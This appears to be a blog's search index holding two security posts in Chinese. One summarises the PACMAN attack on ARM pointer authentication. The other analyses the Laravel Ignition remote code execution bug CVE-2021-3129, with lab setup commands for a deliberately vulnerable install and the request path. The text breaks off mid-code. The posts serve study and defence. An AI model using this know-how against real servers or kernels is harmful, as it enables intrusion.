<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PACMAN: Attacking ARM Pointer Authentication with Speculative Execution</title>
    <link href="/2022/06/28/2022-06-28-PACMAN/"/>
    <url>/2022/06/28/2022-06-28-PACMAN/</url>
    
    <content type="html"><![CDATA[<blockquote><p>paper: <a href="https://pacmanattack.com/paper.pdf">https://pacmanattack.com/paper.pdf</a></p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>這篇 paper 提出新的攻擊方式叫做 PACMAN，結合 memory corruption 漏洞和 speculative excution 漏洞的攻擊，利用 side channels 在不造成 crash 的情況下 speculatively leaks PAC verification，並在 Apple M1 SoC (第一個支援 ARM Pointer Authentication 的個人電腦處理器) 上成功利用。</p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>PACMAN 主要是個跟硬體有關的攻擊，先前曾經有像是 Meltdown 和 Spectre 也都是和硬體有關的漏洞，這個 PACMAN 主要就是攻擊 speculative exection (推測執行)這個特性來 bypass ARM 的 pointer 驗證</p><h3 id="ARM-Pointer-Authentication"><a href="#ARM-Pointer-Authentication" class="headerlink" title="ARM Pointer Authentication"></a>ARM Pointer Authentication</h3><p>一般在做 memory 相關的攻擊時，常常會要控制 data pointer 然後控執行流程，所以 ARM 就有提供 Pointer Authentication (PA) 來保護 pointer 不被亂動，有了這個保護機制讓竄改 pointer 不被發現變很難。</p><p>通常實際的 address space 在 64-bit 架構下是小於 64 bits 的，所以沒用到的 bits 就能拿來存一個 hash 值 (Pointer Authentication Code PAC) 來保護 pointer，若用 pointer 的時候 PAC 不對程式就會 crash 掉。</p><p>PAC 可以小到 11 bits 大到 31 bits (看系統設定)，不過即使很小也不太可能被暴力破解，因為 crash 掉之後重啟就會用新的 secret key，而且太頻繁 crash 掉也容易被發現。</p><h3 id="Key-Challenge"><a href="#Key-Challenge" class="headerlink" title="Key Challenge"></a>Key Challenge</h3><p>在 Apple 上研究的難點</p><ul><li>很少關於他們 micro-architectural 的公開文件</li><li>by default, to not expose a high-resolution timer to userspace<ul><li>(說是對微架構逆向很重要)</li></ul></li></ul><h3 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h3><ul><li>propose the PACMAN attack</li><li>develop micro-architectural timing side-channel attack primitives and a reverse engineering tool for Apple M1 processors</li><li>reverse engineer the TLB organizations and perform the first TLB-based side-channel attack with speculative execution on Apple M1 processors</li><li>show that the PACMAN attack works across privilege levels (We demonstrate several proof-of-concept of PACMAN attacks, including constructing PAC oracles, brute-forcing PACs, and a control-flow hijacking attack targeting a PAenabled kernel module)</li></ul><h3 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h3><ul><li>業界，可以影響所有有用上現有 PAC 設計的 ARM 處理器</li><li>學術，很多 based on memory 安全前提的論文和假設都可以被推翻，有必要變動 threat mode 重新評估</li><li>highlights that security mechanisms that employ a securityby-crash design principle and rely on low collision probability are potentially vulnerable to speculative execution attacks</li><li>speculation can serve as a primitive to suppress crashes</li></ul><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><h3 id="Memory-Corruption-Vulnerabilities"><a href="#Memory-Corruption-Vulnerabilities" class="headerlink" title="Memory Corruption Vulnerabilities"></a>Memory Corruption Vulnerabilities</h3><p>在低階語言寫的軟體中出現，包括</p><ul><li>out-of-bound writes</li><li>out-of-bound read</li><li>use-after-free</li><li>doublefree bugs</li><li>integer overflows and underflows</li><li>size confusion attacks</li><li>type confusion attacks</li></ul><p>可以竄改或破壞掉原本 memory 中的東西，像是 data and code pointers，去修改 code pointer 可以改變程式的執行流程，造成嚴重的影響，這又叫做 control-flow hijacking attacks，像是 ROP 和 JOP 都算是。</p><p>常見的保護包括</p><ul><li>stack canaries</li><li>data execution prevention</li><li>ASLR</li><li>kASLR (kernel ASLR)</li></ul><p>雖然提供了保護提升攻擊難度但還是都有被繞過的可能。</p><h3 id="ARM-Pointer-Authentication-1"><a href="#ARM-Pointer-Authentication-1" class="headerlink" title="ARM Pointer Authentication"></a>ARM Pointer Authentication</h3><p>ARMv8.3 開始提供的 overhead 很小的保護機制，保護 pointer 不會被亂改，主要就是去幫 pointer 簽一個 hash，這裡稱為 Pointer Authentication Code (PAC)，在用這個 pointer 之前會先檢查 PAC。</p><h4 id="Signing-and-Verifying-Pointers"><a href="#Signing-and-Verifying-Pointers" class="headerlink" title="Signing and Verifying Pointers"></a>Signing and Verifying Pointers</h4><p>實際上 64 bits 架構的 address space 不會真的用到 64 bits，PA 就會把 PAC 吋在多的沒用到的 bits。<br><img src="https://i.imgur.com/1ME9fSO.png?350x"><br>圖中拿來簽hash 的這個 context value 裡面有存在高權限才碰得到的 register 中的 key 和 program-specified salt。</p><h4 id="ISA-Extension"><a href="#ISA-Extension" class="headerlink" title="ISA Extension"></a>ISA Extension</h4><p><img src="https://i.imgur.com/b1DqMo7.png?350x"><br>為了提供 PA 功能，PA 提供了兩組 instructions sets 來做這些事</p><ul><li><code>pac</code> 開頭的是做 signing 的工作<ul><li>最多有五組的 key 可以同時硬體記錄著，當次 signing 要用的 key 跟  opcode 有關</li><li>ex. <code>pacia ptr, salt</code></li></ul></li><li><code>aut</code> 則是做驗證</li></ul><p>在 Apple 晶片中除了保護 return address，PAC 也被用來保護很多其他的 data structures，包括 C++ vtable pointers、vtable entries、Objective-C method caches。</p><h3 id="Micro-architectural-Side-Channels"><a href="#Micro-architectural-Side-Channels" class="headerlink" title="Micro-architectural Side Channels"></a>Micro-architectural Side Channels</h3><p>有 shared micro-architectural structures (including caches , TLBs, functional units, and network-on-chips) 都可以被用來 leak 重要資訊</p><h4 id="Prime-Probe"><a href="#Prime-Probe" class="headerlink" title="Prime+Probe"></a>Prime+Probe</h4><ul><li>限制最少的 </li><li>attacker 先把 cache 塞滿，victim 存取過後，attacker 可以再去 access 整個 cache 利用時間差來知道 victim access 了哪些東西</li></ul><h4 id="Flush-Reload"><a href="#Flush-Reload" class="headerlink" title="Flush+Reload"></a>Flush+Reload</h4><ul><li>需要 sharing memory</li><li>先 flush 掉要觀察的 memory 位置，然後等受害者執行完以後再去掃記憶體，就可以由時間差知道那些有被存取過</li><li>Meltdown 與 Spectre 都有用到的</li></ul><h4 id="Evict-Reload"><a href="#Evict-Reload" class="headerlink" title="Evict+Reload"></a>Evict+Reload</h4><ul><li>需要 sharing memory</li><li>類似 Prime+Probe，不過對象是 shared memory</li></ul><h3 id="Speculative-Execution-Attacks"><a href="#Speculative-Execution-Attacks" class="headerlink" title="Speculative Execution Attacks"></a>Speculative Execution Attacks</h3><p>Speculative execution 又翻推測執行，是處理器的一個優化，因為處理器速度很快，所以為了更好的利用資源處理器會偷跑，像是分支預測，他會在分支判斷之前就先猜這次的分支會走哪一條，然後先偷跑，猜對了就可以直接繼續，猜錯了就會到分岔點走正確的路，但這樣的優化反而衍生出一些漏洞。</p><h4 id="Meltdown"><a href="#Meltdown" class="headerlink" title="Meltdown"></a>Meltdown</h4><p>利用 exception 和預先執行，在發生 exception 停下來之前偷跑到後面，load 重要資訊的指令，然後停下。</p><h4 id="Spectre"><a href="#Spectre" class="headerlink" title="Spectre"></a>Spectre</h4><p>conditional branches 或是 indirect branch。</p><h2 id="Threat-Model"><a href="#Threat-Model" class="headerlink" title="Threat Model"></a>Threat Model</h2><ul><li>Target<ul><li>在一個有開 PA 的 victim 上用 PAC oracle 爆出 PAC 成功達成 control flow hijacking attack</li></ul></li><li>Attacker<ul><li>unprivileged userspace application</li></ul></li><li>Victim<ul><li>the operating system kernel</li></ul></li><li>Assumption<ol><li>在 victim program 中有個可以 exploit 的 memory corruption 漏洞，可以讓攻擊者任意寫入 memory</li><li>有開 PA 而且存在 PACMAN gadgets</li><li>可以做 side channel attack (要有high-resolution timer)</li></ol></li></ul><h2 id="The-PACMAN-Attack"><a href="#The-PACMAN-Attack" class="headerlink" title="The PACMAN Attack"></a>The PACMAN Attack</h2><p>主要就是在不造成 crash 的情況下利用 speculative execution attacks 和 micro-architectural side channels 來 leak PAC verification 的結果。</p><h3 id="PACMAN-gadgets"><a href="#PACMAN-gadgets" class="headerlink" title="PACMAN gadgets"></a>PACMAN gadgets</h3><p>有些可以利用的 code patterns 這邊會稱作 PACMAN gadgets，由兩種 operation 組成</p><ul><li>verification<br>  verifies the PAC，給一個 pointer ，然後他會驗證 PAC 是否正確，正確就 output 一個有效的 pointer，錯誤就 output 一個壞的 pointer，執行的時候就會出錯 (前面 Background 有講過)</li><li>transmission<br>  他會預先去執行 verificated 的輸出 (pointer) (可能是個 load&#x2F;store，反正就是預先轉成 physical address 去使用他)，如果過了就會產生可以被觀察到的 side effect (就能經由 side channel 偷相關的資訊)，若預先執行失敗就會有個 speculative exception，而這些因為都是在 mis-speculated branch 之下發生的所有不會造成 crash</li></ul><p>其中 PACMAN gadgets 又分成以下兩種<br><img src="https://i.imgur.com/ggHiYGL.png"></p><ul><li>Data PACMAN Gadget (圖3c)<ul><li>預先去猜分支做 data accesses 造成的</li><li>AUT: pointer authentication instruction</li><li>guessed_ptr: 攻擊者提供的 pointer</li><li>verified_ptr: AUT 的 output pointer</li><li>觀察有沒有執行 load 還是 exception 的差異來知道 pointer 對不對</li></ul></li><li>Instruction PACMAN Gadget (圖3d)<ul><li>預先去猜分支做 instruction fetches 造成的</li><li>在完成 AUT 之前會使用 branch target buffer (BTB) 預測 BR2 (這在 nested branch 的分支預測中很常見)</li><li>AUT 完成後發現 BR2 預測錯誤所以 eagerly squashes BR2</li><li>fetch 正確的 BR2 (也就是剛剛 AUT 的結果)</li><li>限制:<ul><li>必須支援 eager squashing of nested branches，一定要有第三步的 squash AUT 後的 pointer 才會被用，才能 leak AUT 結果</li><li>需要區分 fetching the verified pointer 和 BTB prediction 的 side effect，以這裡用的 PoC 用的 TLB-based side channel， BTB prediction 和 verified pointer 要在不同 page 才行<br><img src="https://i.imgur.com/X67JkSK.png?400x"></li></ul></li></ul></li></ul><h3 id="Gadget-Detection"><a href="#Gadget-Detection" class="headerlink" title="Gadget Detection"></a>Gadget Detection</h3><p>用 Ghidra’s scripting API 找 kernel 中 conditional branches，檢查它之後的 32 個 instructions，若驗證後的 pointer 會被用在 transmit instruction (a memory access or a branch instruction) 就視為 PACMAN Gadget。</p><p>在 xnu-8019.80.24 中找到13867 個 data PACMAN gadgets 和 41292 個 instruction PACMAN gadgets，因為這裡只往後找 32 個指令，所以若再找多一點還說不定更多。</p><h3 id="An-End-to-End-Illustrative-Example"><a href="#An-End-to-End-Illustrative-Example" class="headerlink" title="An End-to-End Illustrative Example"></a>An End-to-End Illustrative Example</h3><p><img src="https://i.imgur.com/s62UYtI.png?450x"><br>有個 BoF 可以蓋到 function pointer。</p><ol><li>先正常執行程式，train BTB 和 branch predictor (cond &#x3D; true)</li><li>BoF 竄改 fp，猜 PAC 直到猜中 (cond &#x3D; false，不真的進 branch，而是讓它 speculative 跑進 branch，不會造成 crach)</li><li>最後用猜到的 PAC 成功利用 (con &#x3D; true)</li></ol><h2 id="Attack-Platform"><a href="#Attack-Platform" class="headerlink" title="Attack Platform"></a>Attack Platform</h2><ul><li>Apple M1 SoC<ul><li>第一個支援 ARMv8.3 extensions (包括 PA) 的 aarch64 桌面版本 </li><li>EL0 : usermode programs 執行的地方</li><li>EL1 : kernel 執行的地方</li></ul></li><li>macOS and XNU Kernel<ul><li>OS : macOS</li><li>XNU Kernel<ul><li>有 loadable kernel extensions -&gt; kexts</li><li>在後面他們做 reverse 的時候會用到</li></ul></li></ul></li></ul><p>上述的東西都是沒有 opensource 的而且也沒什麼文件，所以需要做 Reverse 來得到一些需要的資訊，這也是這篇論文其中一大 contribution。</p><h2 id="Reverse-Engineering-Tools"><a href="#Reverse-Engineering-Tools" class="headerlink" title="Reverse Engineering Tools"></a>Reverse Engineering Tools</h2><h3 id="High-Resolution-Timers"><a href="#High-Resolution-Timers" class="headerlink" title="High-Resolution Timers"></a>High-Resolution Timers</h3><p>前面有提到 side channel attack (Prime+Probe)，這種攻擊需要比較精準的時間，所以他們找出 M1 中有那些 timer 可以使用。<br><img src="https://i.imgur.com/uSi0SoO.png?450x"></p><ul><li>CNTPCT_EL0<ul><li>System Counter，所有的 core 都用共享這個 counter 但是 24 MHz 太低了，沒辦法很精準地觀察到有沒有 cache hit&#x2F;miss 這種差異</li></ul></li><li>PMCCNTR_EL0<ul><li>ARM Cycle Count Register，大多 ARM Cortex 處理器都有 performance monitoring units (PMU)，就會有這個 counter，但 M1 的 PMU 不是 standard PMU 所以沒有</li></ul></li><li>PMC0<ul><li>沒有文件提到的，count cycle，另外還有一個 PMC1 count instruction，但都不是 userspace 可以碰到的</li><li>為了可以使用到，他們用了剛剛提到的 kext 修改一個控制的 register PMCR0 來讓 PMC0 可以被 userspace 碰到 (但這是為了 reverse engineering 用的兒部會在攻擊中用到)</li></ul></li><li>Custom Multi-thread Timer<ul><li>自己做了一個不需要 kext 的 userspace accesible timer，做法像這樣<br>  <img src="https://i.imgur.com/jxtNlZS.png?450x"></li><li>isb 是控制流程用的，但是後來發現不加變動會稍微變大，但時間的精細度會高一點所以最後還是拿掉了</li></ul></li></ul><h3 id="PacmanOS"><a href="#PacmanOS" class="headerlink" title="PacmanOS"></a>PacmanOS</h3><p>用 Rust 寫的，可以在 M1 上跑的 bare mental 環境，可以讓他們完全控制整個環境，包括硬體、其他干擾等等方便跑實驗。</p><h2 id="Reverse-Engineering"><a href="#Reverse-Engineering" class="headerlink" title="Reverse Engineering"></a>Reverse Engineering</h2><h3 id="Basic-Memory-Hierarchy-Information"><a href="#Basic-Memory-Hierarchy-Information" class="headerlink" title="Basic Memory Hierarchy Information"></a>Basic Memory Hierarchy Information</h3><p><img src="https://i.imgur.com/9qEmBjx.png?500x"></p><p>M1 用 <a href="https://en.wikipedia.org/wiki/ARM_big.LITTLE">big.LITTLE</a> design</p><blockquote><p>big.LITTLE: ARM 提出的把運算能力比較強的 big core 和比較弱但較不耗電的 little core 結合在一起的組合，這裡用 p-core (Performance) 和 e-core (Efficient) 分別稱呼 big 和 little，但這是 intel 的命名</p></blockquote><p>M1 memory 有兩層的 cache，不同 core 的 size 不一樣，然後 kernel 用 48 bits 的 virtual address 和 16 bit 的 PAC。</p><h3 id="L1-Data-TLB-and-L2-TLB"><a href="#L1-Data-TLB-and-L2-TLB" class="headerlink" title="L1 Data TLB and L2 TLB"></a>L1 Data TLB and L2 TLB</h3><p>主要研究 p-core 的行為，因為在 p-core 上的 speculative 行為會比較可靠，但不像 Linux 有可以直接指定要用哪個 core 執行的 API (<code>taskset</code>)，他們用 <code>pthread_set_qos_class_self_np</code> 來 “建議” kernel 用哪個 core，然後用到的 counter 是會需要 kext 的那個 PCM0。</p><p>做的實驗就是用 Prime+Probe 來測量 TLB 的 size，主要步驟就是</p><ol><li>load 某個 address</li><li>load N 個 address 來把 TLB 塞滿</li><li>再 load 一次最一開始 load 的那個 address，測量 latency</li></ol><p><img src="https://i.imgur.com/kht8qCB.png"></p><p>最後得到 (a) 圖，可以看出每一次的差距都是 TLB size 的臨界 (L1 dTLB&#x2F;L2 TLB)，雖然無法斷言 cache 設計是不是真的就跟推測的一樣但至少可以知道怎麼樣才能填滿 TLB</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs !">1) To evict a page table entry from the L1 dTLB, we can create an eviction set with 12 or more addresses with a stride of 256×16KB.<br>2) To evict a page table entry from the L2 TLB, we can create an eviction set with 23 or more addresses with a stride of 2048×16KB.<br></code></pre></td></tr></table></figure><p>至於 TLB conflicts and cache conflicts 則用不同 load N 個 address 的 address 算法測量，得到 (b) 圖 (L1 cache&#x2F;L2 cache&#x2F;L1 dTLB&#x2F;L2 TLB)</p><h3 id="L1-Instruction-TLB"><a href="#L1-Instruction-TLB" class="headerlink" title="L1 Instruction TLB"></a>L1 Instruction TLB</h3><ol><li>先把 L1 dTLB 和 L2 TLB 都填滿</li><li>branch 到某個 address</li><li>執行 N 個 branch 把 iTLB 填滿 (稱為 instruction eviction set)</li><li>Load 第 2 步的那個 address，測量 latency (為什麼是 “load” 得到 data access 的 latency 下面會解釋)</li></ol><p>得到的結果是圖 c，解釋結果之前先講一下他們推論的整個 TLB 架構</p><p><img src="https://i.imgur.com/TrUiXAy.png?500x"></p><ul><li>user 和 kernel 的 L1 iTLB 並不共享，userspace 無法觀察到 kernel space 的差異</li><li>L1 dTLB 是 L1 iTLB 的 non-inclusive backing-store，iTLB 塞滿了就會被塞到 dTLB 去，這就是為什麼剛剛測量的步驟 4 是用 “load” 測量 data access 的 latency</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs !">3) To evict a page table entry from the L1 iTLB, we can create an eviction set with 4 or more branch instructions with a stride of 32×16KB.<br></code></pre></td></tr></table></figure><h3 id="Summary-of-Reverse-Engineering-Results"><a href="#Summary-of-Reverse-Engineering-Results" class="headerlink" title="Summary of Reverse Engineering Results"></a>Summary of Reverse Engineering Results</h3><ul><li>先把 iTLB 填滿之後就能填到 dTLB</li></ul><p><img src="https://i.imgur.com/3PrxiYJ.png?500x"></p><ul><li>不管是用 PMC0 或 Multi-thread Counter 都可以清楚分出有沒有 TLB hit、cache hit 的差別</li></ul><h2 id="Proof-of-Concept-Attacks"><a href="#Proof-of-Concept-Attacks" class="headerlink" title="Proof-of-Concept Attacks"></a>Proof-of-Concept Attacks</h2><h3 id="PAC-Oracles"><a href="#PAC-Oracles" class="headerlink" title="PAC Oracles"></a>PAC Oracles</h3><p>實驗中他們裝個有可以用 syscall trigger PACMAN gadget 的 kext，然後傳一堆有正確 PAC 的 pointer 和沒有 PAC 的 pointer 測試然後用他們定義的那個 counter 測量時間，然後分別用 data access 和 instruction fetch 兩種方式來 leak PAC 是否正確<br><img src="https://i.imgur.com/jnGA7tw.png?500x"></p><ul><li>Leaking via Data Accesses<ul><li>因為 dTLB user 和 kernel 共享，所以可以直接測</li></ul><ol><li>先 train PACMAN gadget 的 branch predictor (64 次)</li><li>Reset the TLB</li><li>Prime the L1 dTLB</li><li>Trigger the PACMAN gadget by passing in the pointer with the PAC to test</li><li>Probe the L1 dTLB set by re-accessing the eviction set and report the number of L1 dTLB misses</li></ol></li><li>Leaking via Instruction Fetches<ul><li>kernelspace 和 userspace 的 L1 iTLBs 不共享，所以從 userspace 觸發 kernelspace 的 self-conflicts，然後塞滿它的 iTLB 進而塞到 dTLB (共享的)</li><li>前面步驟都跟 data access 一樣</li></ul><ol start="5"><li>用塞滿 iTLB 的 set 去塞塞看</li><li>最後檢查有沒有塞到 dTLB 去就知道有沒有 miss 了</li></ol></li></ul><h3 id="Brute-Force-Attack"><a href="#Brute-Force-Attack" class="headerlink" title="Brute-Force Attack"></a>Brute-Force Attack</h3><ul><li>Attack Speed<ul><li>M1 uses a 16-bit PAC</li><li>2.94 minutes on average 試玩所有可能的 PAC values</li><li>主要花時間的是 train predicter 時的 syscall，可以縮短但非必要</li></ul></li><li>Attack Accuracy<ul><li>noisy environment</li><li>90% correct PAC (45)</li><li>10% no PAC value was found (5)</li><li>沒有 false Positive (找錯 PAC)</li></ul></li></ul><h3 id="Jump2Win-Attack"><a href="#Jump2Win-Attack" class="headerlink" title="Jump2Win Attack"></a>Jump2Win Attack</h3><p>有 PAC 就能單純的去利用漏洞了<br><img src="https://i.imgur.com/ryxncvG.png?500x"><br><img src="https://i.imgur.com/NgeVvd3.png?500x"></p><h2 id="Contermeasures"><a href="#Contermeasures" class="headerlink" title="Contermeasures"></a>Contermeasures</h2><ul><li>explore PAC-agnostic execution<ul><li>修改架構或軟體來確保 PAC 不會在 speculation 的時候被驗證並使用</li><li>speculative execution 在 memory access  和 branch 要用驗證後的 pointer 時暫停下來<ul><li><code>fence</code>&#x2F;<code>isb</code></li><li>效能變差</li></ul></li><li>預先執行的時候總是假設 PAC 會過<ul><li>預先執行 invalid pointers 可能造成 Meltdown-style vulnerability</li><li>需要和 Meltdown 的 mitigation 配合</li></ul></li></ul></li><li>用防範 Spectre 的方法改良<ul><li>讓 speculative load 沒辦法被觀測到<ul><li>Invisible speculation mechanisms</li><li>such as InvisiSpec, SafeSpec, and Delay-on-Miss</li></ul></li><li>利用 information flow tracking 來防止 leaking speculatively accessed secret<ul><li>STT, NDA, and Dolma </li><li>taint pointer authentication instruction</li></ul></li></ul></li><li>別寫出有 memory corruption 洞的程式</li></ul>]]></content>
    
    
    <categories>
      
      <category>paper</category>
      
    </categories>
    
    
    <tags>
      
      <tag>paper</tag>
      
      <tag>security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2021-3129 Laravel debug mode: Remote code execution</title>
    <link href="/2022/03/08/2022-03-07-CVE-2021-3129/"/>
    <url>/2022/03/08/2022-03-07-CVE-2021-3129/</url>
    
    <content type="html"><![CDATA[<h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><ul><li>Docker Ubuntu 20.04.3</li><li>PHP 7.3.33<ul><li><a href="https://websiteforstudents.com/how-to-check-install-specific-version-of-php-in-ubuntu-linux/">How to Check &amp; Install Specific version of PHP in Ubuntu Linux</a><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> docker run -it --name cve-<span class="hljs-number">2021</span>-<span class="hljs-number">3129</span> -p <span class="hljs-number">8999</span>:<span class="hljs-number">80</span> ubuntu:<span class="hljs-number">20</span>.<span class="hljs-number">04</span><br></code></pre></td></tr></table></figure><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs smali">apt update<br>apt install software-properties-common<span class="hljs-built_in"></span><br><span class="hljs-built_in">add-apt-repository </span>ppa:ondrej/php<br>apt-get update<br>apt install php7.3=7.3.33-1+ubuntu20.04.1+deb.sury.org+1<br><br>apt install git<br>apt install php7.3-xml<br>apt install php7.3-mbstring<br></code></pre></td></tr></table></figure><h3 id="Composer"><a href="#Composer" class="headerlink" title="Composer"></a>Composer</h3></li></ul></li><li>照著 <a href="https://getcomposer.org/download/">document</a> 的安裝方式<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&quot;copy(&#x27;https://getcomposer.org/installer&#x27;, &#x27;composer-setup.php&#x27;);&quot;</span><br>php -r <span class="hljs-string">&quot;if (hash_file(&#x27;sha384&#x27;, &#x27;composer-setup.php&#x27;) === &#x27;906a84df04cea2aa72f40b5f787e49f22d4c2f19492ac310e8cba5b96ac8b64115ac402c8cd292b8a03482574915d1a8&#x27;) &#123; echo &#x27;Installer verified&#x27;; &#125; else &#123; echo &#x27;Installer corrupt&#x27;; unlink(&#x27;composer-setup.php&#x27;); &#125; echo PHP_EOL;&quot;</span><br>php composer-setup.php<br>php -r <span class="hljs-string">&quot;unlink(&#x27;composer-setup.php&#x27;);&quot;</span><br><span class="hljs-built_in">mv</span> ./composer.phar /usr/bin/composer<br></code></pre></td></tr></table></figure><h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3></li><li><a href="https://github.com/laravel/laravel.git">laravel</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/laravel/laravel.git<br><span class="hljs-built_in">cd</span> laravel<br>git checkout e849812<br>composer install<br>composer require facade/ignition==2.5.1<br><span class="hljs-built_in">cp</span> .env.example .<span class="hljs-built_in">env</span><br>php artisan key:generate<br></code></pre></td></tr></table></figure></li><li><a href="https://github.com/facade">facade</a>&#x2F;<a href="https://github.com/facade/ignition">ignition</a><ul><li>是個 Laravel default 使用的 error page<h3 id="Create-vuln"><a href="#Create-vuln" class="headerlink" title="Create vuln"></a>Create vuln</h3></li></ul></li><li><code>resources/views</code> 下面放會產生 error page 的 <code>test.blade.php</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs htmlembedded">&lt;html&gt;  <br>&lt;body&gt;  <br> &lt;h1&gt; Hello &#123;&#123; $username &#125;&#125; &lt;/h1&gt;  <br>&lt;/body&gt;  <br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>（用 apache 當作 server，所以 laravel 資料夾中的東西要整個移到 &#x2F;var&#x2F;www&#x2F;html 底下）</li><li><code>service apache2 restart</code></li><li><code>routes/web.php</code> 也要照著裡面本來的格式加上 route，就能看到 error page 了<br><img src="https://i.imgur.com/g3OjZSs.png"></li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>按下 Make variable optional 以後就會發個 POST 到 <code>/public/index.php/_ignition/execute-solution</code> ，data 內容是這樣</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">    solution:</span> <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br><span class="hljs-symbol">    parameters:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">        variableName:</span> <span class="hljs-string">&quot;username&quot;</span>, <br><span class="hljs-symbol">        viewFile:</span> <span class="hljs-string">&quot;/var/www/html/resources/views/meow.blade.php&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/BLlyiKs.png"></p><p>搜尋 <code>execute-solution</code> 可以查到在 vendor&#x2F;facade&#x2F;ignition&#x2F;src&#x2F;<br>IgnitionServiceProvider.php 中的這一段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-string">&#x27;execute-solution&#x27;</span>, <span class="hljs-title class_">ExecuteSolutionController</span>::<span class="hljs-variable language_">class</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">middleware</span>(<span class="hljs-title class_">IgnitionConfigValueEnabled</span>::<span class="hljs-variable language_">class</span>.<span class="hljs-string">&#x27;:enableRunnableSolutions&#x27;</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&#x27;executeSolution&#x27;</span>);<br></code></pre></td></tr></table></figure><p>繼續找到 <code>vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php</code> </p><p><img src="https://i.imgur.com/rrpEekN.png"></p><p><code>vendor/facade/ignition/src/Http/Requests/ExecuteSolutionRequest.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$solution</span> = <span class="hljs-title function_ invoke__">app</span>(<span class="hljs-title class_">SolutionProviderRepository</span>::<span class="hljs-variable language_">class</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">getSolutionForClass</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;solution&#x27;</span>));<br></code></pre></td></tr></table></figure><p>到這裡可以知道這個 solution 就是剛剛 request 中的那個 solution</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">solution: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span><br></code></pre></td></tr></table></figure><p>可以繼續搜到<br><code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$parameters</span> = []</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$output</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">makeOptional</span>(<span class="hljs-variable">$parameters</span>);<br>    <span class="hljs-keyword">if</span> (<span 